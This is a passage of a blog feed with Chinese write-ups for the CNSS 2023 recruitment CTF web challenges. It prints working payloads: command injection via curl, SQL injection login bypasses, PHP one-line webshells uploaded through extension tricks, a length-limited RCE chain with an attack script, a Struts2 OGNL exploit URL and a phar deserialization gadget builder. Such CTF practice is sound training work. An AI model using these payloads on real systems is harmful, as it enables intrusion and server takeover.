src="/posts/32752/image-20231217025119348.png" alt="image-20231217025119348"></p><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Block Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CNSS 2023 Recruit WriteUps~~~</title>
    <link href="/posts/43716/"/>
    <url>/posts/43716/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-🦴-babyHTTP"><a href="#Baby-🦴-babyHTTP" class="headerlink" title="[Baby] 🦴 babyHTTP"></a>[Baby] 🦴 babyHTTP</h2><p>Get，Post，Cookie的应用，根据提示一步一步来就好了~~</p><p><code>curl -X POST http://XXXX:XXXX/?CNSS=hackers -d &quot;web=fun&quot; --cookie &quot;admin=true&quot;</code></p><p>（不懂curl的人有难了</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;w2b_1s_Reaiiy_7un!!!&#125;</code></font></center></strong></em></p><h2 id="Baby-🙋-PHPinfo"><a href="#Baby-🙋-PHPinfo" class="headerlink" title="[Baby] 🙋 PHPinfo"></a>[Baby] 🙋 PHPinfo</h2><p>根据提示访问&#x2F;phpinfo.php</p><p><code>Ctrl + F</code> 搜索cnss获得Flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;l3t_u5_l3arn_php1nfo&#125;</code></font></center></strong></em></p><h2 id="baby-🏓-Ping"><a href="#baby-🏓-Ping" class="headerlink" title="[baby] 🏓 Ping"></a>[baby] 🏓 Ping</h2><p>访问题目地址，可知为简单的命令注入，因为没有过滤，那我们就狠狠的inject~~</p><p>还是用curl</p><p><code>curl -X POST http://124.221.34.13:55566/ -d &quot;ip=127.0.0.1;ls&quot;</code></p><p>这里使用<code>;</code>进行隔断，类似的符号还有<code>$</code>,<code>|</code>,<code>-</code>,<code>(</code>,<code>)</code>,<code>`</code>,<code>||</code>,<code>&amp;</code>,<code>&amp;&amp;</code>,<code>&#125;</code>,<code>&#123;</code></p><p>参考 <a href="https://blog.csdn.net/Hardworking666/article/details/120739082">CTFping命令绕过及符号用法_ctf ping-CSDN博客</a></p><p><img src="/posts/43716/image-20231018004049316.png" alt="Ping-1"></p><p>猜一手文件在根目录</p><p><img src="/posts/43716/image-20231018004138053.png" alt="Ping-2"></p><p><code>curl -X POST http://124.221.34.13:55566/ -d &quot;ip=127.0.0.1;cat /flag&quot;</code></p><p>（绕过cat被过滤，可以尝试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">more<br>less<br>head<br>tail<br>...<br></code></pre></td></tr></table></figure><p>得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;p0ng_p0ng_pong!!!&#125;</code></font></center></strong></em></p><h2 id="Baby-🥇-我得再快点"><a href="#Baby-🥇-我得再快点" class="headerlink" title="[Baby+] 🥇 我得再快点"></a>[Baby+] 🥇 我得再快点</h2><p>访问题目地址，看到网页不断刷新以及提示可知为快速计算</p><p>（就是要用脚本访问获取Key的值，并计算出其md5值，再post回去，关键要保证session一致，以保证post对应的网页与get的一致</p><p>这里使用py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><br>m = hashlib.md5()<br>s = requests.Session()<br>url = <span class="hljs-string">&quot;http://124.221.34.13:55590/&quot;</span><br>r = s.get(url)<br>res = r.content<br><span class="hljs-comment"># print(res)</span><br>a = res.find(<span class="hljs-string">&quot;Key : &quot;</span>.encode())<br>b = res.find(<span class="hljs-string">&quot;&lt;span id&quot;</span>.encode())<br><span class="hljs-comment"># print(res[a + 6 : b])</span><br>m.update(res[a + <span class="hljs-number">6</span> : b])<br>url = <span class="hljs-string">f&quot;http://124.221.34.13:55590/check?value=<span class="hljs-subst">&#123;m.hexdigest()&#125;</span>&quot;</span><br>r = s.get(url)<br><br><span class="hljs-built_in">print</span>(r.content)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;3njoy_py5cript_n0w&#125;</code></font></center></strong></em></p><h2 id="Baby-🐶-CNSS娘の宠物商店"><a href="#Baby-🐶-CNSS娘の宠物商店" class="headerlink" title="[Baby+] 🐶 CNSS娘の宠物商店"></a>[Baby+] 🐶 CNSS娘の宠物商店</h2><p>访问题目地址，根据提示直接右上角进入登录界面，用户名为admin，尝试密码为admin失败（应该不至于吧~~</p><p>猜测sql注入，输入 <code>1&#39;</code> 发现报错</p><p><img src="/posts/43716/image-20231018012052572.png" alt="sql-1"></p><p>可知是单引号过滤，直接尝试万能密码<code>1&#39; or &#39;1&#39;=&#39;1</code> 或<code>-1&#39; or 1=1 #</code></p><p><img src="/posts/43716/image-20231018012252032.png" alt="sql-2"></p><p>芜湖~~~</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;h0W_d1d_y0u_l0g1n_t0_my_4dm1n_p4n3l?&#125;</code></font></center></strong></em></p><h2 id="Easy-🥵-2048"><a href="#Easy-🥵-2048" class="headerlink" title="[Easy] 🥵 2048"></a>[Easy] 🥵 2048</h2><p>访问题目地址，<del>嘿嘿直接开玩，不就1000000分吗</del></p><p>老规矩F12看看，<del>欸怎么把键盘按爆了都没反应</del>，过滤了功能键区，再试试<code>Ctrl+Shift+I</code>或<code>Ctrl+Shift+C</code>成功打开</p><p><img src="/posts/43716/image-20231018012957354.png" alt="2048-1"></p><p>可以看到调用getflag()函数来获取flag</p><p><img src="/posts/43716/image-20231018014010920.png" alt="2048-2"></p><p><code>Ctrl+F</code> 开搜发现在<code>main2048.js</code>里，但是加密了（哭</p><p>简单往下扫一下没发现啥，好好好，回去网页看看，发现score值会变化，那js中必然有函数在使其更新</p><p><img src="/posts/43716/image-20231018014407920.png" alt="2048-3"></p><p>在js中搜<code>score</code>，发现<code>updateScore()</code>函数，控制台尝试<code>updateScore(1000001)</code>，发现虽然数值改变了，但点flag仍然不行（这不是掩耳盗铃吗~~</p><p>在其他函数搜score，发现score为全局定义的变量，每次加分都会随着更新，嘿嘿，那不直接控制台改一下就好了</p><p><img src="/posts/43716/image-20231018015007695.png" alt="2048-4"></p><p>再点flag，发现成功啦，哈哈哈哈哈哈哈哈哈</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;3asy_fr0nt_kn0wledge&#125;</code></font></center></strong></em></p><h2 id="Easy-👤-换个头像先"><a href="#Easy-👤-换个头像先" class="headerlink" title="[Easy] 👤 换个头像先"></a>[Easy] 👤 换个头像先</h2><p>访问题目地址，右上角随便注册一下，登录，发现要让我们换头像</p><p>应该是文件上传题，一句话木马启动，</p><p><code>&lt;?php @eval($_POST[1]);?&gt;</code>写入文件，并改后缀为jpg</p><p>BurpSuite启动，开启代理抓包，上传jpg</p><p><img src="/posts/43716/image-20231018231323142.png" alt="upload-1"></p><p>将后缀改为<code>php</code>（如果有过滤可以尝试<code>php2</code>,<code>php3</code>,<code>php4</code>,<code>php5</code>,<code>phtml</code>,以及大小写和复写等其他</p><p><img src="/posts/43716/image-20231018231853632.png" alt="upload-2"></p><p>放行，并查看http历史记录查看上传目录</p><p><img src="/posts/43716/image-20231018232023920.png" alt="upload-3"></p><p>然后蚁剑启动</p><p><img src="/posts/43716/image-20231018232249862.png" alt="upload-4"></p><p>getshell，访问根目录得到flag</p><p><img src="/posts/43716/image-20231018232349889.png" alt="upload-5"></p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;D4ng3r0us_F1l3_Up10ad!&#125;</code></font></center></strong></em></p><h2 id="Mid-7️⃣-EZRCCCCE"><a href="#Mid-7️⃣-EZRCCCCE" class="headerlink" title="[Mid] 7️⃣ EZRCCCCE"></a>[Mid] 7️⃣ EZRCCCCE</h2><p>访问题目地址</p><p><img src="/posts/43716/image-20231018232631239.png" alt="rce-1"></p><p>观察代码，filter函数中做了过滤，接下来的代码对Get的内容做了长度限制，第一眼没见过，开搜，查阅得知，linux中可以在没有写完的命令后面加\，可以将一条命令写在多行中</p><p>比如一条命令cat flag可以如下表示</p><p><img src="/posts/43716/image-20231018233553058.png" alt="rce-2"></p><p>同时把命令一行一行写进文本中也是可以执行的</p><p><img src="/posts/43716/image-20231018235251293.png" alt="rce-3"></p><p>注意是<code>\\</code>，因为要防止被转义</p><p>以及<code>&gt;&gt;</code>和<code>&gt;</code>的区别：</p><p><strong>&gt;&gt; 是追加内容 &gt;&#96; 是覆盖原有内容</strong></p><p>于是网上找了个脚本（我才不是脚本小子呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment"># 需要写入的一句话木马</span><br><br>PD9waHAgZXZhbCgkX0dFVFsxXSk7 <span class="hljs-comment"># base64编码后</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php # 组合一下<br></code></pre></td></tr></table></figure><p>payload.txt:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">hp</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.p\\</span><br><span class="language-bash">&gt;d\&gt;\\</span><br><span class="language-bash">&gt;\ -\\</span><br><span class="language-bash">&gt;e64\\</span><br><span class="language-bash">&gt;bas\\</span><br><span class="language-bash">&gt;7\|\\</span><br><span class="language-bash">&gt;XSk\\</span><br><span class="language-bash">&gt;Fsx\\</span><br><span class="language-bash">&gt;dFV\\</span><br><span class="language-bash">&gt;kX0\\</span><br><span class="language-bash">&gt;bCg\\</span><br><span class="language-bash">&gt;XZh\\</span><br><span class="language-bash">&gt;AgZ\\</span><br><span class="language-bash">&gt;waH\\</span><br><span class="language-bash">&gt;PD9\\</span><br><span class="language-bash">&gt;o\ \\</span><br><span class="language-bash">&gt;ech\\</span><br><span class="language-bash"><span class="hljs-built_in">ls</span> -t&gt;0</span><br>sh 0<br></code></pre></td></tr></table></figure><p>ls -t是根据时间顺序把文件名列出来，刚好满足我们需求，但注意：<strong>是倒序</strong>，这也就是为什么<code>payload.txt</code>中的命令是反的了</p><p>python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://124.221.34.13:55559/?6=&#123;0&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]start attack!!!&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span> + url.<span class="hljs-built_in">format</span>(i.strip()))<br>        requests.get(url.<span class="hljs-built_in">format</span>(i.strip()))<br><br><span class="hljs-comment"># 检查是否攻击成功</span><br>test = requests.get(<br>    <span class="hljs-string">&quot;http://124.221.34.13:55559/sandbox/d178dace7559b986abd1b832eabef837/1.php&quot;</span><br>)<br><span class="hljs-keyword">if</span> test.status_code == requests.codes.ok:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]Attack success!!!&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>这边还有个小点，也就是那个sandbox的目录名</p><p><img src="/posts/43716/image-20231018235956427.png" alt="rce-4"></p><p>因为限制8个字符，所以可以直接通过<code>ls ..</code>来获得</p><p><img src="/posts/43716/image-20231019001329749.png" alt="rce-5"></p><p>然后就可以拼接地址</p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php</code></p><p>因为前面木马是GET形式所以直接访问</p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php?1=system(&#39;ls /&#39;);</code></p><p>（<strong>注意分号别忘了</strong></p><p><img src="/posts/43716/image-20231019001809761.png" alt="rce-6"></p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php?1=system(&#39;cat /flag&#39;);</code>得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;y0u_kn0w_h0w_7o_k22p_fit&#125;</code></font></center></strong></em></p><h2 id="Mid-🐱-Tomcat-cat"><a href="#Mid-🐱-Tomcat-cat" class="headerlink" title="[Mid] 🐱 Tomcat?cat~"></a>[Mid] 🐱 Tomcat?cat~</h2><p>嘿嘿，这题当时想了好久，后面才发现网页标题有提示<strong>Struct2</strong>，开搜</p><p>但是看了半天其实也没看太懂，这里贴一下别人的原理解释</p><blockquote><p>Struts 2 框架的表单验证机制（ Validation ）主要依赖于两个拦截器：validation 和 workflow。validation 拦截器工作时，会根据 XML 配置文件来创建一个验证错误列表；workflow 拦截器工作时，会根据 validation 拦截器所提供的验证错误列表，来检查当前所提交的表单是否存在验证错误。</p><p>在默认配置下，如果 workflow 拦截器检测到用户所提交的表单存在任何一个验证错误，workflow 拦截器都会将用户的输入进行解析处理，随即返回并显示处理结果。</p><p>Struts 2 框架中的一个标签处理功能： altSyntax</p><p>altSyntax 功能是 Struts 2 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行。</p><p>altSyntax 功能在处理标签时，对 OGNL 表达式的解析能力实际上是依赖于开源组件 XWork。</p><p>于是，在 XWork 组件版本小于 2.0.4 以及 altSyntax 功能开启的情况下，恶意攻击者可以通过提交一个带有 OGNL 表达式的表单请求，故意触发表单验证错误——最终该表单请求中恶意的 OGNL 表达式会被 XWork 组件解析并执行，随即由 workflow 拦截器返回执行结果。</p></blockquote><p>再贴一个找到的exp，稍微修改下对应命令就能找到flag了：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?age=<span class="hljs-meta">%27</span>+<span class="hljs-meta">%2B</span>+<span class="hljs-meta">%28</span><span class="hljs-meta">%23_memberAccess</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%22allowStaticMethodAccess</span><span class="hljs-meta">%22</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3Dtrue</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%23foo</span><span class="hljs-meta">%3Dnew</span>+java<span class="hljs-built_in">.lang</span>.Boolean<span class="hljs-meta">%28</span><span class="hljs-meta">%22false</span><span class="hljs-meta">%22</span><span class="hljs-meta">%29</span>+<span class="hljs-meta">%2C</span><span class="hljs-meta">%23context</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%22xwork</span>.MethodAccessor.denyMethodExecution<span class="hljs-meta">%22</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%23foo</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%40org</span>.apache.commons.io.IOUtils<span class="hljs-meta">%40toString</span><span class="hljs-meta">%28</span><span class="hljs-meta">%40java</span><span class="hljs-built_in">.lang</span>.Runtime<span class="hljs-meta">%40getRuntime</span><span class="hljs-meta">%28</span><span class="hljs-meta">%29</span>.exec<span class="hljs-meta">%28</span><span class="hljs-meta">%27ls</span> webapps/flaaaaaaag<span class="hljs-meta">%27</span><span class="hljs-meta">%29</span>.getInputStream<span class="hljs-meta">%28</span><span class="hljs-meta">%29</span><span class="hljs-meta">%29</span><span class="hljs-meta">%29</span>+<span class="hljs-meta">%2B</span>+<span class="hljs-meta">%27</span><br></code></pre></td></tr></table></figure><p>至于为什么选择age，因为逐个尝试只有他回显了</p><p><em><strong>TODO：才疏学浅，以后有空再来理解一遍</strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;t0mcat_1s_4_cute_cat_m1a0&#125;</code></font></center></strong></em></p><h2 id="Mid-🔧-where-is-my-unserialize"><a href="#Mid-🔧-where-is-my-unserialize" class="headerlink" title="[Mid] 🔧 where is my unserialize?"></a>[Mid] 🔧 where is my unserialize?</h2><p>这题也磨了好久，访问题目，到处点点</p><p>发现查看文件可以查看源码，那就一个个试下</p><p>index.php:</p><p><img src="/posts/43716/image-20231019005106778.png" alt="image-20231019005106778"></p><p>base.php:<img src="/posts/43716/image-20231019005332254.png" alt="image-20231019005332254"></p><p>upload_file.php:<img src="/posts/43716/image-20231019005437122.png" alt="image-20231019005437122"></p><p>file.php:</p><p><img src="/posts/43716/image-20231019005500258.png" alt="image-20231019005500258"></p><p>function.php:<img src="/posts/43716/image-20231019005529014.png" alt="image-20231019005529014"></p><p>class.php:<img src="/posts/43716/image-20231019005718896.png" alt="image-20231019005718896"></p><p><img src="/posts/43716/image-20231019005731143.png" alt="image-20231019005731143"></p><p><img src="/posts/43716/image-20231019005753405.png" alt="image-20231019005753405"></p><p>有点多。。。</p><p>这也是我之前没见过的题，用到了<strong>phar</strong>，本来想网上找个模板套一下试试，结果成功了</p><p>贴一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNSS</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shin0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct($name)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;name=$name;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function __wakeup()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;shin0 = &#x27;cnss&#x27;;</span><br><span class="hljs-comment">        $this-&gt;_sayhello();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function _sayhello()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        echo (&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function __destruct()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;shin0 = $this-&gt;name;</span><br><span class="hljs-comment">        echo $this-&gt;shin0.&#x27;&lt;br&gt;&#x27;;</span><br><span class="hljs-comment">    &#125;*/</span><br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CN55</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;params = array();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __invoke()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        return $this-&gt;_get(&#x27;key&#x27;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function _get($key)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="hljs-comment">            $value = $this-&gt;params[$key];</span><br><span class="hljs-comment">        &#125; else &#123;</span><br><span class="hljs-comment">            $value = &quot;index.php&quot;;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        return $this-&gt;file_get($value);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function file_get($value)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $text = base64_encode(file_get_contents($value));</span><br><span class="hljs-comment">        return $text;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$haha</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct($file)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;key = $file;</span><br><span class="hljs-comment">        echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __toString()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $func = $this-&gt;haha[&#x27;hehe&#x27;];</span><br><span class="hljs-comment">        return $func();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __call($key,$value)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;$key = $value;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function _show()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="hljs-comment">            die(&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;);</span><br><span class="hljs-comment">        &#125; else &#123;</span><br><span class="hljs-comment">            highlight_file($this-&gt;source);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __wakeup()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;   //Do you know &#x27;Php ARchive&#x27;?</span><br><span class="hljs-comment">            echo &quot;hacker~&quot;;</span><br><span class="hljs-comment">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">*/</span><br>&#125;<br><span class="hljs-variable">$cnss</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CNSS</span>();<br><span class="hljs-variable">$cn55</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CN55</span>();<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$cn55</span>-&gt;params[<span class="hljs-string">&#x27;key&#x27;</span>]=<span class="hljs-string">&#x27;f1ag.php&#x27;</span>;<br><span class="hljs-variable">$cnss</span>-&gt;name = <span class="hljs-variable">$show</span>;<br><span class="hljs-variable">$show</span>-&gt;haha[<span class="hljs-string">&#x27;hehe&#x27;</span>]=<span class="hljs-variable">$cn55</span>;<br><span class="hljs-variable">$phartest</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//开始缓冲 Phar 写操作</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$cnss</span>);<span class="hljs-comment">//自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><em><strong>TODO：哭了，当时看的好绕，不是很懂，以后再来看看</strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Y0u_Kn0w_PHP_v2ry_we11!!&#125;</code></font></center></strong></em></p><h2 id="Mid-🚓-can-can-need-shell"><a href="#Mid-🚓-can-can-need-shell" class="headerlink" title="[Mid] 🚓 can can need shell"></a>[Mid] 🚓 can can need shell</h2><p>根据hint:</p><p><a href="https://github.com/z-song/laravel-admin/issues/5764">https://github.com/z-song/laravel-admin/issues/5764</a></p><p>可以找到别人对漏洞的复现:</p><p><a href="https://flyd.uk/post/cve-2023-24249/">https://flyd.uk/post/cve-2023-24249/</a></p><p>访问admin目录，<em><strong>admin&#x2F;admin</strong></em>登录</p><p>这个漏洞是<strong>任意文件上传</strong></p><p>具体方法如下：</p><p>把一句话木马写入文件，文件后缀改为<strong>jpg</strong></p><p>使用<strong>BurpSuite</strong>抓包，先不更改，直接放行</p><p>再到http历史记录中找到post记录，并右键进行重放</p><p><img src="/posts/43716/image-20231019011616135.png" 